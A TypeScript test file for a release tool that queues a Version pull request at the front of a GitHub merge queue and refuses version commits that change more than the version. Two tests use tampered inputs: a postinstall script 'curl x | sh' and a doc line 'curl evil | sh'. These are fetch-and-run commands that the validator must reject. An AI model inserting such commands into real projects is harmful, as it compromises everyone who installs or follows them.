import assert from "node:assert/strict";
import { once } from "node:events";
import { mkdtemp, readdir, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { test } from "node:test";

import {
	acquireReleaseLock,
	addedChangesets,
	gateState,
	isAtFront,
	liftReleaseLock,
	onlyVersionField,
	onlyVersionLine,
	ownWaitingRuns,
	parseArguments,
	parseChanges,
	parseHeld,
	type QueueApi,
	type QueueEntry,
	queueVersionPullRequest,
	RELEASE_BOT,
	unreviewable,
	type VersionCommit,
	type VersionPullRequest,
} from "./queue-version-pr.ts";

void test("the release marker brackets a green Version jump and the pinned draft", async (t) => {
	const directory = await mkdtemp(path.join(tmpdir(), "release-lock-"));
	t.after(async () => rm(directory, { recursive: true }));
	const marker = path.join(directory, "queue-frozen");
	const fake = fakeQueue();
	let checks: VersionPullRequest["checks"] = "pending";
	let merged = false;
	let draft = false;
	const logs = t.mock.method(console, "log", () => undefined);
	const armedEntry = entry(15);
	const needsReview = entry(16);
	const armed = new Set([armedEntry, needsReview]);
	const api = {
		...fake.api,
		repository: "example/project",
		versionPullRequest: async () => ({ ...READY, checks }),
		versionAt: async () => "1.0.0-rc.12",
		verifySource: async (tag: string, sha: string) => {
			assert.equal(tag, "v1.0.0-rc.12");
			assert.equal(sha, "a".repeat(40));
			if (!draft) {
				throw new Error("draft target differs");
			}
		},
		call: async (_command: string, args: string[]) => {
			if (args[0] === "api") {
				assert.ok(args.some((arg) => arg.startsWith("query=query")));
				return [...armed].map((candidate) => JSON.stringify(candidate)).join("\n");
			}
			const number = Number(args[2]);
			const pr = [...QUEUED, READY, armedEntry, needsReview].find(
				(candidate) => candidate.number === number,
			);
			assert.ok(pr);
			if (args[1] === "merge") {
				const disabling = args.includes("--disable-auto");
				await readFile(disabling ? marker : `${marker}.recovery`);
				if (disabling) {
					armed.delete(pr);
				} else {
					armed.add(pr);
				}
				return "";
			}
			return JSON.stringify({
				...pr,
				state: number === READY.number && merged ? "MERGED" : "OPEN",
				baseRefName: "main",
				reviewDecision: number === needsReview.number ? "REVIEW_REQUIRED" : "APPROVED",
				mergeCommit: { oid: "a".repeat(40) },
				autoMergeRequest: null,
			});
		},
	};
	await assert.rejects(acquireReleaseLock(api, marker), /has not passed/u);
	await assert.rejects(readFile(marker), { code: "ENOENT" });
	checks = "success";
	await acquireReleaseLock(api, marker);
	assert.deepEqual(fake.queue.numbers(), [READY.number]);
	assert.equal(armed.size, 0);
	await assert.rejects(liftReleaseLock(api, marker, false), /has not merged/u);
	merged = true;
	fake.queue.remove(READY.id);
	await assert.rejects(liftReleaseLock(api, marker, false), /draft target differs/u);
	await readFile(marker);
	assert.deepEqual(fake.queue.numbers(), []);
	draft = true;
	await liftReleaseLock(api, marker, false);
	assert.deepEqual(
		fake.queue.numbers(),
		QUEUED.map(({ number }) => number),
	);
	assert.deepEqual([...armed], [armedEntry]);
	await assert.rejects(readFile(marker), { code: "ENOENT" });
	assert.ok(
		logs.mock.calls.some(({ arguments: args }) =>
			String(args[0]).includes(
				`Skipped armed #16 at ${needsReview.headRefOid}: review decision is REVIEW_REQUIRED`,
			),
		),
	);
	const receipts = await readdir(directory);
	assert.equal(receipts.length, 1);
	const [receipt] = receipts;
	assert.ok(typeof receipt === "string" && receipt.startsWith("queue-frozen.lifted-"));
	const contents = await readFile(path.join(directory, receipt), "utf8");
	assert.ok(contents.includes(needsReview.headRefOid));
});

void test("only a changeset added after the Version PR's base makes it stale", () => {
	const diff = [
		"A\0.changeset/later-fix.md",
		"M\0.changeset/README.md",
		"A\0.changeset/pre/consumed.md",
		"D\0.changeset/consumed-elsewhere.md",
		"A\0.changeset/config.json",
		"A\0.changeset/a\ttab.md",
		"",
	].join("\0");
	assert.deepEqual(addedChangesets(diff), [".changeset/later-fix.md", ".changeset/a\ttab.md"]);
	assert.deepEqual(addedChangesets(""), []);
});

void test("only the front of the queue counts as a jump", () => {
	assert.equal(isAtFront(1), true);
	assert.equal(isAtFront(4), false);
	assert.equal(isAtFront(undefined), false);
});

const entry = (number: number): QueueEntry => ({
	id: `PR_${number}`,
	number,
	headRefOid: String(number).repeat(40).slice(0, 40),
});
const QUEUED = [entry(11), entry(12), entry(13)];
const READY: VersionPullRequest = { ...entry(4719), approved: true, checks: "success" };

/** The head that maintenance makes: the version, its notes, and nothing else. */
const PACKAGE_BEFORE = `${JSON.stringify({ name: "hephaestus", version: "1.0.0-rc.11", private: true }, undefined, "\t")}\n`;
const PACKAGE_AFTER = PACKAGE_BEFORE.replace("1.0.0-rc.11", "1.0.0-rc.12");
const K3S_BEFORE =
	'Install it:\n   VERSION=1.0.0-rc.11   # the release, without the leading "v"\n   sh k3s-install.sh\n';
const K3S_AFTER = K3S_BEFORE.replace("1.0.0-rc.11", "1.0.0-rc.12");

/** The head that maintenance makes: one GitHub commit on main with the version and its notes alone. */
const VERSIONED: VersionCommit = {
	pullRequestAuthor: RELEASE_BOT,
	commitAuthor: RELEASE_BOT,
	committer: "web-flow",
	verification: "valid",
	onMain: true,
	changes: parseChanges(
		[
			"M\0package.json",
			"M\0CHANGELOG.md",
			"M\0MIGRATION.md",
			"M\0docs/admin/k3s.mdx",
			"R100\0.changeset/later-fix.md\0.changeset/pre/later-fix.md",
			"D\0.migration/later-step.md",
			"",
		].join("\0"),
	),
	contents: {
		"package.json": { before: PACKAGE_BEFORE, after: PACKAGE_AFTER },
		"docs/admin/k3s.mdx": { before: K3S_BEFORE, after: K3S_AFTER },
	},
};

/** The queue's entries in order, as GitHub keeps them: a jump goes to the front, anything else to the back. */
class OrderedQueue {
	readonly ids: string[] = QUEUED.map((queued) => queued.id);
	readonly known = new Map([...QUEUED, READY].map((known) => [known.id, known]));

	entries(): QueueEntry[] {
		return this.ids.flatMap((id) => this.known.get(id) ?? []);
	}

	numbers(): number[] {
		return this.entries().map((queued) => queued.number);
	}

	remove(id: string): void {
		const index = this.ids.indexOf(id);
		if (index !== -1) {
			this.ids.splice(index, 1);
		}
	}

	add(added: QueueEntry, front: boolean): number {
		this.remove(added.id);
		this.known.set(added.id, added);
		if (front) {
			this.ids.unshift(added.id);
		} else {
			this.ids.push(added.id);
		}
		return this.ids.indexOf(added.id) + 1;
	}
}

/** A queue that records every call in order and keeps the queue's order; each hook replaces one answer. */
function fakeQueue(
	overrides:
		| Partial<QueueApi>
		| ((state: { calls: string[]; queue: OrderedQueue }) => Partial<QueueApi>) = {},
) {
	const calls: string[] = [];
	const queue = new OrderedQueue();
	const api: QueueApi = {
		versionPullRequest: async () => READY,
		queued: async () => queue.entries(),
		changesVersion: async () => false,
		unconsumed: async () => [],
		approveRuns: async (pullRequest) => {
			calls.push(`approve runs ${pullRequest.headRefOid.slice(0, 4)}`);
			return 0;
		},
		versionCommit: async () => VERSIONED,
		approve: async (pullRequest) => {
			calls.push(`approve #${pullRequest.number} ${pullRequest.headRefOid.slice(0, 4)}`);
		},
		dequeue: async (pullRequest) => {
			calls.push(`dequeue #${pullRequest.number}`);
			queue.remove(pullRequest.id);
		},
		enqueue: async (pullRequest, jump) => {
			calls.push(`enqueue #${pullRequest.number}${jump ? " jump" : ""}`);
			return queue.add(pullRequest, jump);
		},
		saveHeld: async (entries) => {
			calls.push(`save ${entries.map((held) => `#${held.number}`).join(",")}`);
		},
		...(typeof overrides === "function" ? overrides({ calls, queue }) : overrides),
	};
	return { api, calls, queue };
}

/** A clock that only the fake sleep moves, so no test waits on real time. */
let clock = 0;
const options = {
	hold: true,
	timeoutMs: 60 * 60_000,
	pollMs: 30_000,
	log: () => undefined,
	now: () => clock,
	sleep: async (milliseconds: number) => {
		clock += milliseconds;
	},
};

void test("records the held list before any dequeue, then queues them behind the Version PR in order", async () => {
	const { api, calls } = fakeQueue();
	await queueVersionPullRequest(api, options);
	assert.deepEqual(calls, [
		"save #11,#12,#13",
		"dequeue #11",
		"dequeue #12",
		"dequeue #13",
		"enqueue #4719 jump",
		"enqueue #11",
		"enqueue #12",
		"enqueue #13",
	]);
});

void test("approves a versioned head itself, right after that head's waiting runs", async () => {
	const { api, calls } = fakeQueue({
		versionPullRequest: async () => ({ ...READY, approved: false, checks: "pending" }),
	});
	let elapsed = 0;
	await assert.rejects(
		queueVersionPullRequest(api, {
			...options,
			now: () => elapsed,
			sleep: async (milliseconds) => {
				elapsed += milliseconds;
			},
		}),
		/CI Status Gate has not passed/u,
	);
	const head = READY.headRefOid.slice(0, 4);
	assert.deepEqual(calls.slice(4, 6), [`approve runs ${head}`, `approve #4719 ${head}`]);
});

void test("never approves a head that is not the bot's version commit, and puts the queue back", async () => {
	// The start check passes; the head that maintenance pushed later carries more.
	const moved: VersionPullRequest = { ...READY, approved: false, headRefOid: "c".repeat(40) };
	let reads = 0;
	const { api, calls } = fakeQueue({
		versionPullRequest: async () => {
			reads += 1;
			return reads === 1 ? READY : moved;
		},
		versionCommit: async (pullRequest) =>
			pullRequest.headRefOid === moved.headRefOid
				? { ...VERSIONED, changes: [...VERSIONED.changes, { status: "M", path: "server/x.java" }] }
				: VERSIONED,
	});
	await assert.rejects(
		queueVersionPullRequest(api, options),
		/not a Version PR to queue or approve: .*M server\/x\.java/u,
	);
	assert.equal(
		calls.some((call) => call.startsWith("approve #")),
		false,
	);
	assert.deepEqual(calls.slice(-3), ["enqueue #11", "enqueue #12", "enqueue #13"]);
});

void test("a Version PR head is reviewable only as GitHub's one commit for the bot on main", () => {
	assert.equal(unreviewable(VERSIONED), undefined);
	assert.match(
		unreviewable({ ...VERSIONED, commitAuthor: "someone" }) ?? "",
		/not github-actions\[bot\]/u,
	);
	assert.match(
		unreviewable({ ...VERSIONED, pullRequestAuthor: "someone" }) ?? "",
		/pull request is by someone/u,
	);
	// The bot's e-mail as author, signed by a writer's own key.
	assert.match(
		unreviewable({ ...VERSIONED, committer: "a-writer" }) ?? "",
		/committed by a-writer/u,
	);
	assert.match(
		unreviewable({ ...VERSIONED, verification: "unsigned" }) ?? "",
		/verification "unsigned"/u,
	);
	// A commit below the head would merge unread.
	assert.match(
		unreviewable({ ...VERSIONED, onMain: false }) ?? "",
		/not one commit on a commit of main/u,
	);
});

/** The verdict on a version commit that also makes this one change. */
const extra = (status: string, file: string, to?: string) =>
	unreviewable({
		...VERSIONED,
		changes: [{ status, path: file, ...(to === undefined ? {} : { to }) }],
	});

void test("a Version PR head may change only what versioning writes", () => {
	assert.match(extra("A", "server/x.java") ?? "", /A server\/x\.java/u);
	assert.match(extra("A", ".changeset/new.md") ?? "", /A \.changeset\/new\.md/u);
	assert.match(extra("R100", ".changeset/a.md", "docs/a.md") ?? "", /R100 \.changeset\/a\.md/u);
	// An edited note on its way into the released set, or one under another name.
	assert.match(extra("R090", ".changeset/a.md", ".changeset/pre/a.md") ?? "", /R090/u);
	assert.match(extra("R100", ".changeset/a.md", ".changeset/pre/b.md") ?? "", /R100/u);
	assert.match(extra("A", ".changeset/pre/a.md") ?? "", /A \.changeset\/pre\/a\.md/u);
	assert.match(extra("M", ".changeset/pre.json") ?? "", /M \.changeset\/pre\.json/u);
	assert.match(extra("A", ".migration/new.md") ?? "", /A \.migration\/new\.md/u);
	assert.match(extra("D", "package.json") ?? "", /D package\.json/u);
	assert.match(extra("C75", "CHANGELOG.md", "docs/x.md") ?? "", /C75/u);
	assert.equal(extra("R100", ".changeset/a.md", ".changeset/pre/a.md"), undefined);
	assert.equal(extra("D", ".changeset/a.md"), undefined);
});

void test("package.json may change its version alone, and k3s.mdx its version line alone", () => {
	assert.equal(onlyVersionField(PACKAGE_BEFORE, PACKAGE_AFTER), true);
	const overridden = PACKAGE_AFTER.replace(
		'"private": true',
		'"private": true, "scripts": { "postinstall": "curl x | sh" }',
	);
	assert.equal(onlyVersionField(PACKAGE_BEFORE, overridden), false);
	assert.equal(onlyVersionField(PACKAGE_BEFORE, "not json"), false);
	assert.equal(onlyVersionLine(K3S_BEFORE, K3S_AFTER), true);
	assert.equal(
		onlyVersionLine(K3S_BEFORE, K3S_AFTER.replace("sh k3s-install.sh", "curl evil | sh")),
		false,
	);
	assert.equal(
		onlyVersionLine(K3S_BEFORE, K3S_BEFORE.replace("Install it:", "Install it now:")),
		false,
	);
	assert.equal(onlyVersionLine(K3S_BEFORE, `${K3S_AFTER}extra\n`), false);
	const tampered = {
		...VERSIONED,
		contents: {
			...VERSIONED.contents,
			"package.json": { before: PACKAGE_BEFORE, after: overridden },
		},
	};
	assert.match(unreviewable(tampered) ?? "", /M package\.json/u);
});

void test("a moved head that is not a version commit gets neither its runs nor itself approved", async () => {
	const moved: VersionPullRequest = {
		...READY,
		approved: false,
		checks: "pending",
		headRefOid: "d".repeat(40),
	};
	let reads = 0;
	const { api, calls } = fakeQueue({
		versionPullRequest: async () => {
			reads += 1;
			return reads === 1 ? READY : moved;
		},
		versionCommit: async (pullRequest) =>
			pullRequest.headRefOid === moved.headRefOid
				? { ...VERSIONED, committer: "a-writer" }
				: VERSIONED,
	});
	await assert.rejects(
		queueVersionPullRequest(api, options),
		/not a Version PR to queue or approve/u,
	);
	assert.equal(
		calls.some((call) => call.startsWith("approve")),
		false,
	);
	assert.deepEqual(calls.slice(-3), ["enqueue #11", "enqueue #12", "enqueue #13"]);
});

void test("waits while the Version PR is stale or unapproved, and approves only its own waiting runs", async () => {
	// The start check, then: stale, its checks waiting, and green but unapproved, which the run approves.
	const states: VersionPullRequest[] = [
		READY,
		READY,
		{ ...READY, checks: "pending" },
		{ ...READY, approved: false },
	];
	const stale = [[".changeset/later.md"], [], [], []];
	let elapsed = 0;
	const approved: string[] = [];
	const { api, calls } = fakeQueue({
		versionPullRequest: async () => states.shift() ?? READY,
		unconsumed: async () => stale.shift() ?? [],
		approveRuns: async (pullRequest) => {
			approved.push(pullRequest.headRefOid);
			return 2;
		},
	});
	await queueVersionPullRequest(api, {
		...options,
		now: () => elapsed,
		sleep: async (milliseconds) => {
			elapsed += milliseconds;
		},
	});
	assert.deepEqual(approved, [READY.headRefOid]);
	assert.equal(states.length, 0);
	// The unapproved head was approved by the run itself.
	assert.equal(calls.includes(`approve #4719 ${READY.headRefOid.slice(0, 4)}`), true);
	assert.equal(calls.filter((call) => call === "enqueue #4719 jump").length, 1);
});

void test("an error or an interrupt during the wait queues the held pull requests again in order", async () => {
	const { api, calls } = fakeQueue({
		unconsumed: async () => {
			throw new Error("git fetch failed");
		},
	});
	await assert.rejects(queueVersionPullRequest(api, options), /git fetch failed/u);
	assert.deepEqual(calls.slice(-3), ["enqueue #11", "enqueue #12", "enqueue #13"]);
	assert.equal(calls.includes("enqueue #4719 jump"), false);

	const controller = new AbortController();
	const interrupted = fakeQueue({ unconsumed: async () => [".changeset/later.md"] });
	await assert.rejects(
		queueVersionPullRequest(interrupted.api, {
			...options,
			signal: controller.signal,
			sleep: async () => {
				controller.abort();
				throw new Error("interrupted");
			},
		}),
		/interrupted/u,
	);
	assert.deepEqual(interrupted.calls.slice(-3), ["enqueue #11", "enqueue #12", "enqueue #13"]);
});

void test("gives up at the timeout, names the reason and queues the held pull requests again", async () => {
	let elapsed = 0;
	const { api, calls } = fakeQueue({ unconsumed: async () => [".changeset/later.md"] });
	await assert.rejects(
		queueVersionPullRequest(api, {
			...options,
			now: () => elapsed,
			sleep: async (milliseconds) => {
				elapsed += milliseconds;
			},
		}),
		/gave up after 60 min: main merged 1 changesets .*later\.md/u,
	);
	assert.deepEqual(calls.slice(-3), ["enqueue #11", "enqueue #12", "enqueue #13"]);
});

void test("a refused jump dequeues the Version PR, queues the held ones again and fails", async () => {
	const { api, calls } = fakeQueue({
		enqueue: async (pullRequest, jump) => {
			calls.push(`enqueue #${pullRequest.number}${jump ? " jump" : ""}`);
			return jump ? 4 : 2;
		},
	});
	await assert.rejects(queueVersionPullRequest(api, options), /position 4, not at the front/u);
	assert.deepEqual(calls.slice(4), [
		"enqueue #4719 jump",
		"dequeue #4719",
		"enqueue #11",
		"enqueue #12",
		"enqueue #13",
	]);

	const thrown = fakeQueue({
		enqueue: async (pullRequest, jump) => {
			if (jump) {
				throw new Error("not allowed");
			}
			return 2;
		},
	});
	await assert.rejects(
		queueVersionPullRequest(thrown.api, options),
		/refused to queue #4719 at the front/u,
	);
});

void test("refuses before holding anything when the head is not a version commit or a queued PR changes the version", async () => {
	const foreign = fakeQueue({
		versionCommit: async () => ({ ...VERSIONED, commitAuthor: "someone" }),
	});
	await assert.rejects(
		queueVersionPullRequest(foreign.api, options),
		/not a Version PR to queue or approve/u,
	);
	assert.deepEqual(foreign.calls, []);

	const versioned = fakeQueue({ changesVersion: async (pullRequest) => pullRequest.number === 12 });
	await assert.rejects(
		queueVersionPullRequest(versioned.api, options),
		/#12 in the queue changes the version/u,
	);
	assert.deepEqual(versioned.calls, []);

	const queued = fakeQueue({ queued: async () => [...QUEUED, READY] });
	await assert.rejects(queueVersionPullRequest(queued.api, options), /already queued/u);
	assert.deepEqual(queued.calls, []);
});

void test("a pull request that GitHub refuses to queue again is named, and the others still go back", async () => {
	const { api, calls } = fakeQueue({
		enqueue: async (pullRequest, jump) => {
			calls.push(`enqueue #${pullRequest.number}${jump ? " jump" : ""}`);
			if (pullRequest.number === 12) {
				throw new Error("checks failed");
			}
			return jump ? 1 : 2;
		},
	});
	await assert.rejects(
		queueVersionPullRequest(api, options),
		/could not queue again: #12: checks failed/u,
	);
	assert.deepEqual(calls.slice(-3), ["enqueue #11", "enqueue #12", "enqueue #13"]);
});

void test("reads back the held list that a killed run left", () => {
	assert.deepEqual(parseHeld(JSON.stringify(QUEUED)), QUEUED);
	assert.throws(() => parseHeld("{}"));
});

void test("a dequeue cut off in flight is still queued again, and the old order holds", async () => {
	const { api, calls, queue } = fakeQueue((state) => ({
		dequeue: async (pullRequest) => {
			state.calls.push(`dequeue #${pullRequest.number}`);
			state.queue.remove(pullRequest.id);
			if (pullRequest.number === 12) {
				// GitHub applied the dequeue, but the answer never arrived.
				throw new Error("socket hang up");
			}
		},
	}));
	await assert.rejects(queueVersionPullRequest(api, options), /socket hang up/u);
	// #13 was never dequeued, so it goes out and back in behind #11 and #12.
	assert.deepEqual(queue.numbers(), [11, 12, 13]);
	assert.deepEqual(calls.slice(-4), ["dequeue #13", "enqueue #11", "enqueue #12", "enqueue #13"]);
});

void test("a Version PR left behind others is named when its dequeue fails", async () => {
	const { api } = fakeQueue((state) => ({
		enqueue: async (pullRequest, jump) => {
			state.calls.push(`enqueue #${pullRequest.number}${jump ? " jump" : ""}`);
			return jump ? 5 : 2;
		},
		dequeue: async (pullRequest) => {
			state.calls.push(`dequeue #${pullRequest.number}`);
			if (pullRequest.number === 4719) {
				throw new Error("rate limited");
			}
		},
	}));
	await assert.rejects(
		queueVersionPullRequest(api, options),
		/#4719 is queued at position 5.*dequeue it by hand now/u,
	);
});

void test("a head that moved just before the jump is waited for, not refused", async () => {
	const moved: VersionPullRequest = { ...READY, headRefOid: "f".repeat(40) };
	let reads = 0;
	let jumps = 0;
	const { api, calls } = fakeQueue({
		versionPullRequest: async () => {
			reads += 1;
			return reads <= 2 ? READY : moved;
		},
		enqueue: async (pullRequest, jump) => {
			calls.push(`enqueue #${pullRequest.number}${jump ? " jump" : ""}`);
			if (jump) {
				jumps += 1;
				if (jumps === 1) {
					throw new Error("expected head oid did not match");
				}
			}
			return jump ? 1 : 2;
		},
	});
	await queueVersionPullRequest(api, { ...options, sleep: async () => undefined });
	assert.equal(jumps, 2);
	assert.deepEqual(calls.slice(-3), ["enqueue #11", "enqueue #12", "enqueue #13"]);
});

void test("the newest gate run decides, and only a failure or timeout fails", () => {
	assert.equal(gateState([]), "pending");
	assert.equal(gateState([{ id: 1, conclusion: "success" }]), "success");
	assert.equal(
		gateState([
			{ id: 2, conclusion: "cancelled" },
			{ id: 1, conclusion: "failure" },
		]),
		"pending",
	);
	assert.equal(
		gateState([
			{ id: 1, conclusion: "cancelled" },
			{ id: 2, conclusion: "success" },
		]),
		"success",
	);
	assert.equal(gateState([{ id: 3, conclusion: "timed_out" }]), "failure");
	assert.equal(gateState([{ id: 3, conclusion: null, status: "in_progress" }]), "pending");
});

void test("only the Version PR's own waiting runs at its exact head are approved", () => {
	const head = READY.headRefOid;
	const own = {
		id: 1,
		head_sha: head,
		head_branch: "changeset-release/main",
		event: "pull_request",
		status: "action_required",
		head_repository: { full_name: "owner/repo" },
	};
	const runs = [
		own,
		{ ...own, id: 2, head_sha: "f".repeat(40) },
		{ ...own, id: 3, head_branch: "feature" },
		{ ...own, id: 4, event: "push" },
		{ ...own, id: 5, head_repository: { full_name: "fork/repo" } },
		{ ...own, id: 6, status: "completed" },
	];
	assert.deepEqual(
		ownWaitingRuns(runs, head, "owner/repo").map((run) => run.id),
		[1],
	);
});

void test("the command line takes a positive timeout and refuses anything else", () => {
	assert.deepEqual(parseArguments(["--hold"]), { hold: true, timeoutMinutes: 60 });
	assert.deepEqual(parseArguments(["--hold", "--timeout-minutes", "45"]), {
		hold: true,
		timeoutMinutes: 45,
	});
	assert.deepEqual(parseArguments(["--resume", "held.json"]), {
		hold: false,
		timeoutMinutes: 60,
		resume: "held.json",
	});
	assert.throws(() => parseArguments(["--timeout-minutes", "60m"]), /positive number/u);
	assert.throws(() => parseArguments(["--timeout-minutes", "0"]), /positive number/u);
	assert.throws(() => parseArguments(["--timeout-minutes", "--hold"]), /needs a value/u);
	assert.throws(() => parseArguments(["--fast", "1"]), /not an option/u);
});

void test("the queue ends with the Version PR at the front and the held pull requests behind it in order", async () => {
	const { api, queue } = fakeQueue();
	await queueVersionPullRequest(api, options);
	assert.deepEqual(queue.numbers(), [4719, 11, 12, 13]);
});

void test("a run that GitHub reports as completed and waiting for approval is approved", () => {
	const head = READY.headRefOid;
	const waiting = {
		id: 7,
		head_sha: head,
		head_branch: "changeset-release/main",
		event: "pull_request",
		status: "completed",
		conclusion: "action_required",
		head_repository: { full_name: "owner/repo" },
	};
	assert.deepEqual(
		ownWaitingRuns([waiting, { ...waiting, id: 8, conclusion: "success" }], head, "owner/repo").map(
			(run) => run.id,
		),
		[7],
	);
});

void test("an approved, green head that is not a version commit is never queued", async () => {
	const foreign: VersionPullRequest = { ...READY, headRefOid: "b".repeat(40) };
	let reads = 0;
	const { api, calls } = fakeQueue({
		versionPullRequest: async () => {
			reads += 1;
			return reads === 1 ? READY : foreign;
		},
		versionCommit: async (pullRequest) =>
			pullRequest.headRefOid === foreign.headRefOid
				? { ...VERSIONED, changes: [...VERSIONED.changes, { status: "M", path: "server/x.java" }] }
				: VERSIONED,
	});
	await assert.rejects(queueVersionPullRequest(api, options), /M server\/x\.java/u);
	assert.equal(calls.includes("enqueue #4719 jump"), false);
});

/** A queue where the jump applies but its answer is lost; `landsAtFront` says whether GitHub honoured it. */
const lostJump = (landsAtFront: boolean) =>
	fakeQueue((state) => ({
		enqueue: async (pullRequest, jump) => {
			state.calls.push(`enqueue #${pullRequest.number}${jump ? " jump" : ""}`);
			const position = state.queue.add(pullRequest, jump && landsAtFront);
			if (jump) {
				throw new Error("502 Bad Gateway");
			}
			return position;
		},
	}));

void test("a jump whose answer was lost is kept at the front, or taken out from behind others", async () => {
	const front = lostJump(true);
	await queueVersionPullRequest(front.api, options);
	assert.deepEqual(front.queue.numbers(), [4719, 11, 12, 13]);

	// Without a hold the others stay queued, so a jump that GitHub did not honour lands behind them.
	const back = lostJump(false);
	await assert.rejects(
		queueVersionPullRequest(back.api, { ...options, hold: false, timeoutMs: 0 }),
		/position 4, not at the front/u,
	);
	assert.deepEqual(back.queue.numbers(), [11, 12, 13]);
});

void test("a stalled forward call is cancelled, and the queue is put back through calls that are not", async () => {
	const controller = new AbortController();
	const forward = fakeQueue({
		unconsumed: async () => {
			const aborted = once(controller.signal, "abort");
			controller.abort();
			await aborted;
			throw new Error("git fetch was cancelled");
		},
	});
	const restoring = fakeQueue();
	for (const held of QUEUED) {
		restoring.queue.remove(held.id);
	}
	await assert.rejects(
		queueVersionPullRequest(forward.api, {
			...options,
			signal: controller.signal,
			restore: restoring.api,
		}),
		/cancelled/u,
	);
	assert.deepEqual(restoring.queue.numbers(), [11, 12, 13]);
	assert.equal(
		forward.calls.some((call) => call === "enqueue #11"),
		false,
	);
});
